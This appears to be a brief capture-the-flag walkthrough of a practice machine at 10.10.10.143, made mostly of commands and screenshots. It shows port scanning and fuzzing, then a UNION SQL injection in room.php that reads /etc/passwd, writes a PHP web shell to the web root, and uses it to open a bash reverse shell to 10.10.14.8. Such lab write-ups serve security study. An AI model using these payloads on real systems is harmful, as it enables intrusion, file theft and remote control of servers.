```
SQL injection
```

```
nmap -sS -sC -sV -T5 -Pn 10.10.10.143
```
![image](https://user-images.githubusercontent.com/33616880/231966154-8ab1d289-572e-4097-8072-e2a664de70ca.png)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.143/FUZZ -fc 403 -e .aspx,.php,.txt,.html
```
![image](https://user-images.githubusercontent.com/33616880/231966267-6a6058e9-6223-44d8-acd9-72244a55407f.png)


```
http://10.10.10.143/room.php?cod=2
```
![image](https://user-images.githubusercontent.com/33616880/231967239-40ac1ae1-c35f-4c56-9740-62bd236b9436.png)



![image](https://user-images.githubusercontent.com/33616880/231967279-462d7629-3f4f-4f75-bff1-b82ba0cfeb7b.png)

![image](https://user-images.githubusercontent.com/33616880/231967320-8aa8e60a-e6b3-4552-882e-0ad264e09771.png)



![image](https://user-images.githubusercontent.com/33616880/231967993-6a81e947-d988-4e23-9042-a8ba3eb2bca0.png)



![image](https://user-images.githubusercontent.com/33616880/231968678-abdd6033-6a96-45b6-bc8e-0fd5e45791de.png)
![image](https://user-images.githubusercontent.com/33616880/231968797-0152fad4-d673-488d-aff8-4cbd8d10910d.png)
![image](https://user-images.githubusercontent.com/33616880/231968997-2d0da6ba-012b-480d-83b6-8c185543e797.png)


```
http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'
```
![image](https://user-images.githubusercontent.com/33616880/231969952-3829cca0-1e62-48ed-a680-8e597d111ff8.png)
![image](https://user-images.githubusercontent.com/33616880/231969969-fe7ccd80-1d5e-4185-9c24-377b58bbe4e1.png)


```
http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=whoami'
```
![image](https://user-images.githubusercontent.com/33616880/231971738-3210b286-20ab-471c-8c63-556e238f3523.png)
![image](https://user-images.githubusercontent.com/33616880/231971768-31d1b5c7-93bb-4b3a-8b4e-d648a22900ce.png)


```
curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.8/1234 0>&1"'
```
![image](https://user-images.githubusercontent.com/33616880/231972202-e13e19ba-e5cd-4ef9-8b24-ed13676f248b.png)
![image](https://user-images.githubusercontent.com/33616880/231972255-3fcdf22f-ef68-4a2a-87b3-c189d8936720.png)




